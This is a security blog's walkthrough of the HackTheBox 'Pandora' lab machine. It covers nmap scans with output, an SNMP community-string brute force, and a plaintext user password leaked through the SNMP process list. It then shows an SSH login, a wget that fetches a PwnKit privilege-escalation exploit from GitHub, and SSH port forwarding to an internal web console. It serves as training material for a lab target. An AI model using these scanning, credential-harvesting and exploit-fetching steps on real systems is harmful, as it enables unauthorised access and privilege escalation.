<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="PANDORA (Linux) Walkthrough  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.136 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &amp;hellip;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-pandora/><title>HackTheBox: Pandora :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Pandora"><meta itemprop=description content="PANDORA (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.136 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta itemprop=datePublished content="2022-04-14T00:00:00+00:00"><meta itemprop=dateModified content="2022-04-14T00:00:00+00:00"><meta itemprop=wordCount content="2055"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Pandora"><meta name=twitter:description content="PANDORA (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.136 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta property="og:title" content="HackTheBox: Pandora"><meta property="og:description" content="PANDORA (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.136 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-pandora/"><meta property="article:published_time" content="2022-04-14T00:00:00+00:00"><meta property="article:modified_time" content="2022-04-14T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-04-14 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>Security Blog</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-pandora/>HackTheBox: Pandora</a></h2><div class=post-content><h1 id=pandora-linux-walkthrough>PANDORA (Linux) Walkthrough</h1><p><img src=/assets/Pasted%20image%2020220321125358.png alt="assets/Pasted image 20220321125358.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.136
</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following result &mldr;</p><ul><li><strong>PORT 22</strong> : running SSH (OpenSSH 8.2p1)</li><li><strong>PORT 80</strong> : running HTTP (Apache httpd 2.4.41)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─# nmap -sC -sV -O -oA nmap/initial 10.10.11.136
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-21 05:26 EDT
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.136
Host is up <span style=color:#f92672>(</span>0.35s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>(</span><span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>)</span>
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
TCP/IP fingerprint:
OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.92%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>3/21%OT<span style=color:#f92672>=</span>22%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>30189%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>2%DC<span style=color:#f92672>=</span>I%G<span style=color:#f92672>=</span>Y%TM<span style=color:#f92672>=</span>623844E
OS:4%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>FF%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>106%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>
OS:O1<span style=color:#f92672>=</span>M505ST11NW7%O2<span style=color:#f92672>=</span>M505ST11NW7%O3<span style=color:#f92672>=</span>M505NNT11NW7%O4<span style=color:#f92672>=</span>M505ST11NW7%O5<span style=color:#f92672>=</span>M505ST11
OS:NW7%O6<span style=color:#f92672>=</span>M505ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>FE88%W2<span style=color:#f92672>=</span>FE88%W3<span style=color:#f92672>=</span>FE88%W4<span style=color:#f92672>=</span>FE88%W5<span style=color:#f92672>=</span>FE88%W6<span style=color:#f92672>=</span>FE88<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>
OS:R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>FAF0%O<span style=color:#f92672>=</span>M505NNSNW7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS
OS:%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>
OS:Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>
OS:R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T
OS:<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>
OS:S<span style=color:#f92672>)</span>

Network Distance: <span style=color:#ae81ff>2</span> hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 46.27 seconds

</code></pre></div><p>Let&rsquo;s do a Full machine scan to make sure we are not skipping any ports or services on uncommon ports.</p><p>Running a UDP Scan &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -sU -O 10.10.11.136 -vvv -Pn
</code></pre></div><p>Found a interesting UDP Open Port.</p><ul><li><strong>PORT 161</strong> : running SNMP.</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─# nmap -sU -O 10.10.11.136 -vvv -Pn
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-21 14:17 EDT
Initiating UDP Scan at 14:17
Scanning panda.htb <span style=color:#f92672>(</span>10.10.11.136<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>1000</span> ports<span style=color:#f92672>]</span>
UDP Scan Timing: About 15.50% <span style=color:#66d9ef>done</span>; ETC: 14:20 <span style=color:#f92672>(</span>0:02:49 remaining<span style=color:#f92672>)</span>
UDP Scan Timing: About 30.00% <span style=color:#66d9ef>done</span>; ETC: 14:20 <span style=color:#f92672>(</span>0:02:22 remaining<span style=color:#f92672>)</span>
UDP Scan Timing: About 45.00% <span style=color:#66d9ef>done</span>; ETC: 14:20 <span style=color:#f92672>(</span>0:01:51 remaining<span style=color:#f92672>)</span>
Stats: 0:06:44 elapsed; <span style=color:#ae81ff>0</span> hosts completed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> up<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> undergoing UDP Scan
UDP Scan Timing: About 29.65% <span style=color:#66d9ef>done</span>; ETC: 14:39 <span style=color:#f92672>(</span>0:15:59 remaining<span style=color:#f92672>)</span>
Stats: 0:06:45 elapsed; <span style=color:#ae81ff>0</span> hosts completed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> up<span style=color:#f92672>)</span>, <span style=color:#ae81ff>1</span> undergoing UDP Scan
Discovered open port 161/udp on 10.10.11.136
Completed UDP Scan at 14:49, 1916.09s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1000</span> total ports<span style=color:#f92672>)</span>
Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against panda.htb (10.10.11.136)</span>
Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against panda.htb (10.10.11.136)</span>
Nmap scan report <span style=color:#66d9ef>for</span> panda.htb <span style=color:#f92672>(</span>10.10.11.136<span style=color:#f92672>)</span>
Host is up, received user-set <span style=color:#f92672>(</span>0.35s latency<span style=color:#f92672>)</span>.
Scanned at 2022-03-21 14:17:04 EDT <span style=color:#66d9ef>for</span> 1918s
Not shown: <span style=color:#ae81ff>913</span> closed udp ports <span style=color:#f92672>(</span>port-unreach<span style=color:#f92672>)</span>
PORT      STATE         SERVICE        REASON
22/udp    open|filtered ssh            no-response
53/udp    open|filtered domain         no-response
88/udp    open|filtered kerberos-sec   no-response
139/udp   open|filtered netbios-ssn    no-response
161/udp   open          snmp           udp-response ttl 63
217/udp   open|filtered dbase          no-response
445/udp   open|filtered microsoft-ds   no-response
464/udp   open|filtered kpasswd5       no-response
689/udp   open|filtered nmap           no-response
776/udp   open|filtered wpages         no-response
786/udp   open|filtered concert        no-response
959/udp   open|filtered unknown        no-response
996/udp   open|filtered vsinet         no-response
997/udp   open|filtered maitrd         no-response
1058/udp  open|filtered nim            no-response
1059/udp  open|filtered nimreg         no-response
1068/udp  open|filtered instl_bootc    no-response
1080/udp  open|filtered socks          no-response
1718/udp  open|filtered h225gatedisc   no-response
1885/udp  open|filtered vrtstrapserver no-response
2160/udp  open|filtered apc-2160       no-response
5355/udp  open|filtered llmnr          no-response
5555/udp  open|filtered rplay          no-response
5632/udp  open|filtered pcanywherestat no-response
9370/udp  open|filtered unknown        no-response
10080/udp open|filtered amanda         no-response
21847/udp open|filtered netspeak-cs    no-response
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.92%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>3/21%OT<span style=color:#f92672>=</span>%CT<span style=color:#f92672>=</span>%CU<span style=color:#f92672>=</span>2%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>2%DC<span style=color:#f92672>=</span>I%G<span style=color:#f92672>=</span>N%TM<span style=color:#f92672>=</span>6238C89E%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>
SEQ<span style=color:#f92672>(</span>CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I<span style=color:#f92672>)</span>
T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>
T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>
T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>
U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>
IE<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>

Network Distance: <span style=color:#ae81ff>2</span> hops

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 1918.49 seconds
           Raw packets sent: <span style=color:#ae81ff>2843</span> <span style=color:#f92672>(</span>132.437KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>1450</span> <span style=color:#f92672>(</span>299.306KB<span style=color:#f92672>)</span>

</code></pre></div><p>Running Nmap Scripts on the UDP Port we found earlier.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─# nmap --script snmp-brute 10.10.11.136 -vvv -p <span style=color:#ae81ff>161</span> -sU -Pn
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-22 12:21 EDT
NSE: Loaded <span style=color:#ae81ff>1</span> scripts <span style=color:#66d9ef>for</span> scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 1<span style=color:#f92672>)</span> scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Initiating UDP Scan at 12:21
Scanning panda.htb <span style=color:#f92672>(</span>10.10.11.136<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> port<span style=color:#f92672>]</span>
Discovered open port 161/udp on 10.10.11.136
Completed UDP Scan at 12:21, 0.44s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total ports<span style=color:#f92672>)</span>
NSE: Script scanning 10.10.11.136.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 1<span style=color:#f92672>)</span> scan.
Initiating NSE at 12:21
Completed NSE at 12:22, 12.76s elapsed
Nmap scan report <span style=color:#66d9ef>for</span> panda.htb <span style=color:#f92672>(</span>10.10.11.136<span style=color:#f92672>)</span>
Host is up, received user-set <span style=color:#f92672>(</span>0.41s latency<span style=color:#f92672>)</span>.
Scanned at 2022-03-22 12:21:47 EDT <span style=color:#66d9ef>for</span> 13s

PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63
| snmp-brute: 
|_  public - Valid credentials

NSE: Script Post-scanning.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 1<span style=color:#f92672>)</span> scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.67 seconds
           Raw packets sent: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>149B<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>139B<span style=color:#f92672>)</span>
</code></pre></div><p>Tried Full machine scan as well, Didn&rsquo;t found anything interesting.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -sV -sC -O -p- -oA nmap/full 10.10.11.136
</code></pre></div><p>Its time to enumerate further.</p><hr><h1 id=enumeration>Enumeration</h1><p>During Recon process We found 3 ports Open 2 TCP (22,80), and one UDP (161).
We can enumerate Port 22 but that won&rsquo;t give us large attack surface.
So its a better choice to Enumerate Port 80 and 161.</p><p>Let&rsquo;s Enumerate Port 80 first.</p><h3 id=port-80>PORT 80</h3><p>Port 80 is running apache server.</p><p><img src=/assets/Pasted%20image%2020220327064249.png alt="assets/Pasted image 20220327064249.png"></p><p>Manually browsing around the site did not found anything interesting.
Tried to bruteforce the directories that too didn&rsquo;t gave anything interesting.
Did nikto scan as well , and checked for the apache version if any known vulnerabilities exists. But none of these worked out.
So decided to Enumerate on UDP Port 161.</p><h3 id=port-161-udp>PORT 161 (UDP)</h3><p>Tried to run nmap snmp scripts and got some interesting results.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap --script snmp-brute 10.10.11.136 -vvv -p <span style=color:#ae81ff>161</span> -sU -Pn
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63
| snmp-brute: 
|_  public - Valid credentials

</code></pre></div><p>Found out that the <em>public</em> was the valid credentials.
So we can use snmp-check or snmpwalk to enumerate further.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>snmp-check 10.10.11.136
</code></pre></div><p>OR</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>snmpwalk -v 2c 10.10.11.136 -c public | grep daniel
</code></pre></div><p>snmp-check gave us some interesting results, it provided us the list of running processes.
Out of these running processes , Found a interesting process command which leaked the <em>daniel</em> user credentials.</p><p><img src=/assets/Pasted%20image%2020220325005957.png alt="assets/Pasted image 20220325005957.png"></p><p>Daniel User Credentials &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>username: daniel
password: HotelBabylon23
</code></pre></div><p>We can use these credentials to login as Daniel using ssh.
So let&rsquo;s do that.</p><hr><h1 id=gaining-a-foothold>Gaining a Foothold</h1><p>As we already have the Daniel User Credentials , Let&rsquo;s login using SSH</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>username: daniel
password: HotelBabylon23
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh daniel@10.10.11.136  
</code></pre></div><p>We successfully logged in as Daniel user.
Looking around the system , Figured out that there was one more account <em>matt</em> and one root account.</p><p><img src=/assets/Pasted%20image%2020220327073028.png alt="assets/Pasted image 20220327073028.png"></p><p>Fired up linpeas as <em>daniel</em> user , and Found out that port 80 was running on the machine and also machine was vulnerable to <strong>PWNKIT</strong> and other privilege escalation vulnerabilities.</p><p><img src=/assets/Pasted%20image%2020220327073844.png alt="assets/Pasted image 20220327073844.png"></p><p>I tried the PWNKIT <a href=https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py>Exploit</a>, and it worked out and directly gave us root access along with the user and root flags, But i think it was not the intended way of getting the root access.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
</code></pre></div><p><img src=/assets/Pasted%20image%2020220327074404.png alt="assets/Pasted image 20220327074404.png"></p><p>So i continued.</p><p>From the linpeas result , Found that the local port 80 was running.</p><p><img src=/assets/Pasted%20image%2020220327074649.png alt="assets/Pasted image 20220327074649.png"></p><p>Did a curl request and found out that this port is running some different service other than the one which we were able to found using nmap scan.</p><p><img src=/assets/Pasted%20image%2020220327074914.png alt="assets/Pasted image 20220327074914.png"></p><p>Do further enumerate the http service , we have to port forward the target port 80 to attacker machine, Let&rsquo;s use SSH to do so.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh -L 8080:127.0.0.1:80 daniel@10.10.11.136 -N -f
</code></pre></div><ul><li><strong>-f</strong> : Requests ssh to go to background just before command execution.</li><li><strong>-N</strong> : Do not execute a remote command. This is used for just forwarding ports.</li><li><strong>-L</strong> : Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.</li></ul><p>We are now able to access the http://127.0.0.1:8080 in attacker machine.</p><p><img src=/assets/Pasted%20image%2020220327080347.png alt="assets/Pasted image 20220327080347.png"></p><p>Let&rsquo;s browse the website and try to figure out if we can exploit it somehow to gain access to the root or matt user account.</p><p><img src=/assets/Pasted%20image%2020220327080631.png alt="assets/Pasted image 20220327080631.png"></p><p>Running whatweb against the url &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# whatweb http://127.0.0.1:8080/
http://127.0.0.1:8080/ <span style=color:#f92672>[</span><span style=color:#ae81ff>200</span> OK<span style=color:#f92672>]</span> Apache<span style=color:#f92672>[</span>2.4.41<span style=color:#f92672>]</span>, Country<span style=color:#f92672>[</span>RESERVED<span style=color:#f92672>]</span><span style=color:#f92672>[</span>ZZ<span style=color:#f92672>]</span>, HTTPServer<span style=color:#f92672>[</span>Ubuntu Linux<span style=color:#f92672>]</span><span style=color:#f92672>[</span>Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>]</span>, IP<span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span>, Meta-Refresh-Redirect<span style=color:#f92672>[</span>/pandora_console/<span style=color:#f92672>]</span>
